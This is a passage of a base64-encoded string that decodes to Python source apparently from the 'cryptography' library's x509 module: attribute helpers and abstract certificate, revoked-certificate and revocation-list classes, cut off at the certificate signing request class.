cclxuaW1wb3J0IGRhdGV0aW1lXHJcbmltcG9ydCBvc1xyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeSBpbXBvcnQgdXRpbHNcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJpbmRpbmdzLl9ydXN0IGltcG9ydCB4NTA5IGFzIHJ1c3RfeDUwOVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzLCBzZXJpYWxpemF0aW9uXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IChcclxuICAgIGRzYSxcclxuICAgIGVjLFxyXG4gICAgZWQyNTUxOSxcclxuICAgIGVkNDQ4LFxyXG4gICAgcnNhLFxyXG4gICAgeDI1NTE5LFxyXG4gICAgeDQ0OCxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5hc3ltbWV0cmljLnR5cGVzIGltcG9ydCAoXHJcbiAgICBDRVJUSUZJQ0FURV9JU1NVRVJfUFVCTElDX0tFWV9UWVBFUyxcclxuICAgIENFUlRJRklDQVRFX1BSSVZBVEVfS0VZX1RZUEVTLFxyXG4gICAgQ0VSVElGSUNBVEVfUFVCTElDX0tFWV9UWVBFUyxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5LmV4dGVuc2lvbnMgaW1wb3J0IChcclxuICAgIEV4dGVuc2lvbixcclxuICAgIEV4dGVuc2lvblR5cGUsXHJcbiAgICBFeHRlbnNpb25zLFxyXG4gICAgX21ha2Vfc2VxdWVuY2VfbWV0aG9kcyxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5Lm5hbWUgaW1wb3J0IE5hbWUsIF9BU04xVHlwZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS54NTA5Lm9pZCBpbXBvcnQgT2JqZWN0SWRlbnRpZmllclxyXG5cclxuXHJcbl9FQVJMSUVTVF9VVENfVElNRSA9IGRhdGV0aW1lLmRhdGV0aW1lKDE5NTAsIDEsIDEpXHJcblxyXG5cclxuY2xhc3MgQXR0cmlidXRlTm90Rm91bmQoRXhjZXB0aW9uKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBtc2c6IHN0ciwgb2lkOiBPYmplY3RJZGVudGlmaWVyKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKEF0dHJpYnV0ZU5vdEZvdW5kLCBzZWxmKS5fX2luaXRfXyhtc2cpXHJcbiAgICAgICAgc2VsZi5vaWQgPSBvaWRcclxuXHJcblxyXG5kZWYgX3JlamVjdF9kdXBsaWNhdGVfZXh0ZW5zaW9uKFxyXG4gICAgZXh0ZW5zaW9uOiBFeHRlbnNpb25bRXh0ZW5zaW9uVHlwZV0sXHJcbiAgICBleHRlbnNpb25zOiB0eXBpbmcuTGlzdFtFeHRlbnNpb25bRXh0ZW5zaW9uVHlwZV1dLFxyXG4pIC0+IE5vbmU6XHJcbiAgICAjIFRoaXMgaXMgcXVhZHJhdGljIGluIHRoZSBudW1iZXIgb2YgZXh0ZW5zaW9uc1xyXG4gICAgZm9yIGUgaW4gZXh0ZW5zaW9uczpcclxuICAgICAgICBpZiBlLm9pZCA9PSBleHRlbnNpb24ub2lkOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGlzIGV4dGVuc2lvbiBoYXMgYWxyZWFkeSBiZWVuIHNldC4iKVxyXG5cclxuXHJcbmRlZiBfcmVqZWN0X2R1cGxpY2F0ZV9hdHRyaWJ1dGUoXHJcbiAgICBvaWQ6IE9iamVjdElkZW50aWZpZXIsXHJcbiAgICBhdHRyaWJ1dGVzOiB0eXBpbmcuTGlzdFtcclxuICAgICAgICB0eXBpbmcuVHVwbGVbT2JqZWN0SWRlbnRpZmllciwgYnl0ZXMsIHR5cGluZy5PcHRpb25hbFtpbnRdXVxyXG4gICAgXSxcclxuKSAtPiBOb25lOlxyXG4gICAgIyBUaGlzIGlzIHF1YWRyYXRpYyBpbiB0aGUgbnVtYmVyIG9mIGF0dHJpYnV0ZXNcclxuICAgIGZvciBhdHRyX29pZCwgXywgXyBpbiBhdHRyaWJ1dGVzOlxyXG4gICAgICAgIGlmIGF0dHJfb2lkID09IG9pZDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhpcyBhdHRyaWJ1dGUgaGFzIGFscmVhZHkgYmVlbiBzZXQuIilcclxuXHJcblxyXG5kZWYgX2NvbnZlcnRfdG9fbmFpdmVfdXRjX3RpbWUodGltZTogZGF0ZXRpbWUuZGF0ZXRpbWUpIC0+IGRhdGV0aW1lLmRhdGV0aW1lOlxyXG4gICAgIiIiTm9ybWFsaXplcyBhIGRhdGV0aW1lIHRvIGEgbmFpdmUgZGF0ZXRpbWUgaW4gVVRDLlxyXG5cclxuICAgIHRpbWUgLS0gZGF0ZXRpbWUgdG8gbm9ybWFsaXplLiBBc3N1bWVkIHRvIGJlIGluIFVUQyBpZiBub3QgdGltZXpvbmVcclxuICAgICAgICAgICAgYXdhcmUuXHJcbiAgICAiIiJcclxuICAgIGlmIHRpbWUudHppbmZvIGlzIG5vdCBOb25lOlxyXG4gICAgICAgIG9mZnNldCA9IHRpbWUudXRjb2Zmc2V0KClcclxuICAgICAgICBvZmZzZXQgPSBvZmZzZXQgaWYgb2Zmc2V0IGVsc2UgZGF0ZXRpbWUudGltZWRlbHRhKClcclxuICAgICAgICByZXR1cm4gdGltZS5yZXBsYWNlKHR6aW5mbz1Ob25lKSAtIG9mZnNldFxyXG4gICAgZWxzZTpcclxuICAgICAgICByZXR1cm4gdGltZVxyXG5cclxuXHJcbmNsYXNzIEF0dHJpYnV0ZTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG9pZDogT2JqZWN0SWRlbnRpZmllcixcclxuICAgICAgICB2YWx1ZTogYnl0ZXMsXHJcbiAgICAgICAgX3R5cGU6IGludCA9IF9BU04xVHlwZS5VVEY4U3RyaW5nLnZhbHVlLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX29pZCA9IG9pZFxyXG4gICAgICAgIHNlbGYuX3ZhbHVlID0gdmFsdWVcclxuICAgICAgICBzZWxmLl90eXBlID0gX3R5cGVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBvaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fb2lkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdmFsdWUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbHVlXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gIjxBdHRyaWJ1dGUob2lkPXt9LCB2YWx1ZT17IXJ9KT4iLmZvcm1hdChzZWxmLm9pZCwgc2VsZi52YWx1ZSlcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIEF0dHJpYnV0ZSk6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG5cclxuICAgICAgICByZXR1cm4gKFxyXG4gICAgICAgICAgICBzZWxmLm9pZCA9PSBvdGhlci5vaWRcclxuICAgICAgICAgICAgYW5kIHNlbGYudmFsdWUgPT0gb3RoZXIudmFsdWVcclxuICAgICAgICAgICAgYW5kIHNlbGYuX3R5cGUgPT0gb3RoZXIuX3R5cGVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi5vaWQsIHNlbGYudmFsdWUsIHNlbGYuX3R5cGUpKVxyXG5cclxuXHJcbmNsYXNzIEF0dHJpYnV0ZXM6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBhdHRyaWJ1dGVzOiB0eXBpbmcuSXRlcmFibGVbQXR0cmlidXRlXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9hdHRyaWJ1dGVzID0gbGlzdChhdHRyaWJ1dGVzKVxyXG5cclxuICAgIF9fbGVuX18sIF9faXRlcl9fLCBfX2dldGl0ZW1fXyA9IF9tYWtlX3NlcXVlbmNlX21ldGhvZHMoIl9hdHRyaWJ1dGVzIilcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPEF0dHJpYnV0ZXMoe30pPiIuZm9ybWF0KHNlbGYuX2F0dHJpYnV0ZXMpXHJcblxyXG4gICAgZGVmIGdldF9hdHRyaWJ1dGVfZm9yX29pZChzZWxmLCBvaWQ6IE9iamVjdElkZW50aWZpZXIpIC0+IEF0dHJpYnV0ZTpcclxuICAgICAgICBmb3IgYXR0ciBpbiBzZWxmOlxyXG4gICAgICAgICAgICBpZiBhdHRyLm9pZCA9PSBvaWQ6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYXR0clxyXG5cclxuICAgICAgICByYWlzZSBBdHRyaWJ1dGVOb3RGb3VuZCgiTm8ge30gYXR0cmlidXRlIHdhcyBmb3VuZCIuZm9ybWF0KG9pZCksIG9pZClcclxuXHJcblxyXG5jbGFzcyBWZXJzaW9uKHV0aWxzLkVudW0pOlxyXG4gICAgdjEgPSAwXHJcbiAgICB2MyA9IDJcclxuXHJcblxyXG5jbGFzcyBJbnZhbGlkVmVyc2lvbihFeGNlcHRpb24pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIG1zZzogc3RyLCBwYXJzZWRfdmVyc2lvbjogaW50KSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKEludmFsaWRWZXJzaW9uLCBzZWxmKS5fX2luaXRfXyhtc2cpXHJcbiAgICAgICAgc2VsZi5wYXJzZWRfdmVyc2lvbiA9IHBhcnNlZF92ZXJzaW9uXHJcblxyXG5cclxuY2xhc3MgQ2VydGlmaWNhdGUobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBmaW5nZXJwcmludChzZWxmLCBhbGdvcml0aG06IGhhc2hlcy5IYXNoQWxnb3JpdGhtKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIGJ5dGVzIHVzaW5nIGRpZ2VzdCBwYXNzZWQuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgc2VyaWFsX251bWJlcihzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBjZXJ0aWZpY2F0ZSBzZXJpYWwgbnVtYmVyXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgdmVyc2lvbihzZWxmKSAtPiBWZXJzaW9uOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGNlcnRpZmljYXRlIHZlcnNpb25cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2tleShzZWxmKSAtPiBDRVJUSUZJQ0FURV9QVUJMSUNfS0VZX1RZUEVTOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIHB1YmxpYyBrZXlcclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBub3RfdmFsaWRfYmVmb3JlKHNlbGYpIC0+IGRhdGV0aW1lLmRhdGV0aW1lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIE5vdCBiZWZvcmUgdGltZSAocmVwcmVzZW50ZWQgYXMgVVRDIGRhdGV0aW1lKVxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIG5vdF92YWxpZF9hZnRlcihzZWxmKSAtPiBkYXRldGltZS5kYXRldGltZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBOb3QgYWZ0ZXIgdGltZSAocmVwcmVzZW50ZWQgYXMgVVRDIGRhdGV0aW1lKVxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGlzc3VlcihzZWxmKSAtPiBOYW1lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGlzc3VlciBuYW1lIG9iamVjdC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBzdWJqZWN0KHNlbGYpIC0+IE5hbWU6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUgc3ViamVjdCBuYW1lIG9iamVjdC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBzaWduYXR1cmVfaGFzaF9hbGdvcml0aG0oXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gdHlwaW5nLk9wdGlvbmFsW2hhc2hlcy5IYXNoQWxnb3JpdGhtXTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIGEgSGFzaEFsZ29yaXRobSBjb3JyZXNwb25kaW5nIHRvIHRoZSB0eXBlIG9mIHRoZSBkaWdlc3Qgc2lnbmVkXHJcbiAgICAgICAgaW4gdGhlIGNlcnRpZmljYXRlLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHNpZ25hdHVyZV9hbGdvcml0aG1fb2lkKHNlbGYpIC0+IE9iamVjdElkZW50aWZpZXI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUgT2JqZWN0SWRlbnRpZmllciBvZiB0aGUgc2lnbmF0dXJlIGFsZ29yaXRobS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBleHRlbnNpb25zKHNlbGYpIC0+IEV4dGVuc2lvbnM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhbiBFeHRlbnNpb25zIG9iamVjdC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBzaWduYXR1cmUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUgc2lnbmF0dXJlIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHRic19jZXJ0aWZpY2F0ZV9ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSB0YnNDZXJ0aWZpY2F0ZSBwYXlsb2FkIGJ5dGVzIGFzIGRlZmluZWQgaW4gUkZDIDUyODAuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIENoZWNrcyBlcXVhbGl0eS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19oYXNoX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIENvbXB1dGVzIGEgaGFzaC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYsIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTZXJpYWxpemVzIHRoZSBjZXJ0aWZpY2F0ZSB0byBQRU0gb3IgREVSIGZvcm1hdC5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG4jIFJ1bnRpbWUgaXNpbnN0YW5jZSBjaGVja3MgbmVlZCB0aGlzIHNpbmNlIHRoZSBydXN0IGNsYXNzIGlzIG5vdCBhIHN1YmNsYXNzLlxyXG5DZXJ0aWZpY2F0ZS5yZWdpc3RlcihydXN0X3g1MDkuQ2VydGlmaWNhdGUpXHJcblxyXG5cclxuY2xhc3MgUmV2b2tlZENlcnRpZmljYXRlKG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBzZXJpYWxfbnVtYmVyKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBzZXJpYWwgbnVtYmVyIG9mIHRoZSByZXZva2VkIGNlcnRpZmljYXRlLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHJldm9jYXRpb25fZGF0ZShzZWxmKSAtPiBkYXRldGltZS5kYXRldGltZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBkYXRlIG9mIHdoZW4gdGhpcyBjZXJ0aWZpY2F0ZSB3YXMgcmV2b2tlZC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBleHRlbnNpb25zKHNlbGYpIC0+IEV4dGVuc2lvbnM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhbiBFeHRlbnNpb25zIG9iamVjdCBjb250YWluaW5nIGEgbGlzdCBvZiBSZXZva2VkIGV4dGVuc2lvbnMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuIyBSdW50aW1lIGlzaW5zdGFuY2UgY2hlY2tzIG5lZWQgdGhpcyBzaW5jZSB0aGUgcnVzdCBjbGFzcyBpcyBub3QgYSBzdWJjbGFzcy5cclxuUmV2b2tlZENlcnRpZmljYXRlLnJlZ2lzdGVyKHJ1c3RfeDUwOS5SZXZva2VkQ2VydGlmaWNhdGUpXHJcblxyXG5cclxuY2xhc3MgX1Jhd1Jldm9rZWRDZXJ0aWZpY2F0ZShSZXZva2VkQ2VydGlmaWNhdGUpOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc2VyaWFsX251bWJlcjogaW50LFxyXG4gICAgICAgIHJldm9jYXRpb25fZGF0ZTogZGF0ZXRpbWUuZGF0ZXRpbWUsXHJcbiAgICAgICAgZXh0ZW5zaW9uczogRXh0ZW5zaW9ucyxcclxuICAgICk6XHJcbiAgICAgICAgc2VsZi5fc2VyaWFsX251bWJlciA9IHNlcmlhbF9udW1iZXJcclxuICAgICAgICBzZWxmLl9yZXZvY2F0aW9uX2RhdGUgPSByZXZvY2F0aW9uX2RhdGVcclxuICAgICAgICBzZWxmLl9leHRlbnNpb25zID0gZXh0ZW5zaW9uc1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHNlcmlhbF9udW1iZXIoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9zZXJpYWxfbnVtYmVyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmV2b2NhdGlvbl9kYXRlKHNlbGYpIC0+IGRhdGV0aW1lLmRhdGV0aW1lOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yZXZvY2F0aW9uX2RhdGVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBleHRlbnNpb25zKHNlbGYpIC0+IEV4dGVuc2lvbnM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2V4dGVuc2lvbnNcclxuXHJcblxyXG5jbGFzcyBDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0KG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKHNlbGYsIGVuY29kaW5nOiBzZXJpYWxpemF0aW9uLkVuY29kaW5nKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTZXJpYWxpemVzIHRoZSBDUkwgdG8gUEVNIG9yIERFUiBmb3JtYXQuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGZpbmdlcnByaW50KHNlbGYsIGFsZ29yaXRobTogaGFzaGVzLkhhc2hBbGdvcml0aG0pIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYnl0ZXMgdXNpbmcgZGlnZXN0IHBhc3NlZC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZ2V0X3Jldm9rZWRfY2VydGlmaWNhdGVfYnlfc2VyaWFsX251bWJlcihcclxuICAgICAgICBzZWxmLCBzZXJpYWxfbnVtYmVyOiBpbnRcclxuICAgICkgLT4gdHlwaW5nLk9wdGlvbmFsW1Jldm9rZWRDZXJ0aWZpY2F0ZV06XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhbiBpbnN0YW5jZSBvZiBSZXZva2VkQ2VydGlmaWNhdGUgb3IgTm9uZSBpZiB0aGUgc2VyaWFsX251bWJlclxyXG4gICAgICAgIGlzIG5vdCBpbiB0aGUgQ1JMLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHNpZ25hdHVyZV9oYXNoX2FsZ29yaXRobShcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiB0eXBpbmcuT3B0aW9uYWxbaGFzaGVzLkhhc2hBbGdvcml0aG1dOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYSBIYXNoQWxnb3JpdGhtIGNvcnJlc3BvbmRpbmcgdG8gdGhlIHR5cGUgb2YgdGhlIGRpZ2VzdCBzaWduZWRcclxuICAgICAgICBpbiB0aGUgY2VydGlmaWNhdGUuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgc2lnbmF0dXJlX2FsZ29yaXRobV9vaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBPYmplY3RJZGVudGlmaWVyIG9mIHRoZSBzaWduYXR1cmUgYWxnb3JpdGhtLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGlzc3VlcihzZWxmKSAtPiBOYW1lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIFg1MDlOYW1lIHdpdGggdGhlIGlzc3VlciBvZiB0aGlzIENSTC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBuZXh0X3VwZGF0ZShzZWxmKSAtPiB0eXBpbmcuT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGRhdGUgb2YgbmV4dCB1cGRhdGUgZm9yIHRoaXMgQ1JMLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGxhc3RfdXBkYXRlKHNlbGYpIC0+IGRhdGV0aW1lLmRhdGV0aW1lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIGRhdGUgb2YgbGFzdCB1cGRhdGUgZm9yIHRoaXMgQ1JMLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGV4dGVuc2lvbnMoc2VsZikgLT4gRXh0ZW5zaW9uczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIGFuIEV4dGVuc2lvbnMgb2JqZWN0IGNvbnRhaW5pbmcgYSBsaXN0IG9mIENSTCBleHRlbnNpb25zLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHNpZ25hdHVyZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBzaWduYXR1cmUgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgdGJzX2NlcnRsaXN0X2J5dGVzKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIHRic0NlcnRMaXN0IHBheWxvYWQgYnl0ZXMgYXMgZGVmaW5lZCBpbiBSRkMgNTI4MC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQ2hlY2tzIGVxdWFsaXR5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBOdW1iZXIgb2YgcmV2b2tlZCBjZXJ0aWZpY2F0ZXMgaW4gdGhlIENSTC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgaWR4OiBpbnQpIC0+IFJldm9rZWRDZXJ0aWZpY2F0ZTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgaWR4OiBzbGljZSkgLT4gdHlwaW5nLkxpc3RbUmV2b2tlZENlcnRpZmljYXRlXTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19nZXRpdGVtX18oXHJcbiAgICAgICAgc2VsZiwgaWR4OiB0eXBpbmcuVW5pb25baW50LCBzbGljZV1cclxuICAgICkgLT4gdHlwaW5nLlVuaW9uW1Jldm9rZWRDZXJ0aWZpY2F0ZSwgdHlwaW5nLkxpc3RbUmV2b2tlZENlcnRpZmljYXRlXV06XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyBhIHJldm9rZWQgY2VydGlmaWNhdGUgKG9yIHNsaWNlIG9mIHJldm9rZWQgY2VydGlmaWNhdGVzKS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gdHlwaW5nLkl0ZXJhdG9yW1Jldm9rZWRDZXJ0aWZpY2F0ZV06XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgSXRlcmF0b3Igb3ZlciB0aGUgcmV2b2tlZCBjZXJ0aWZpY2F0ZXNcclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgaXNfc2lnbmF0dXJlX3ZhbGlkKFxyXG4gICAgICAgIHNlbGYsIHB1YmxpY19rZXk6IENFUlRJRklDQVRFX0lTU1VFUl9QVUJMSUNfS0VZX1RZUEVTXHJcbiAgICApIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVmVyaWZpZXMgc2lnbmF0dXJlIG9mIHJldm9jYXRpb24gbGlzdCBhZ2FpbnN0IGdpdmVuIHB1YmxpYyBrZXkuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdC5yZWdpc3RlcihydXN0X3g1MDkuQ2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdClcclxuXHJcblxyXG5jbGFzcyBDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0KG1ldGFjbGFzcz1hY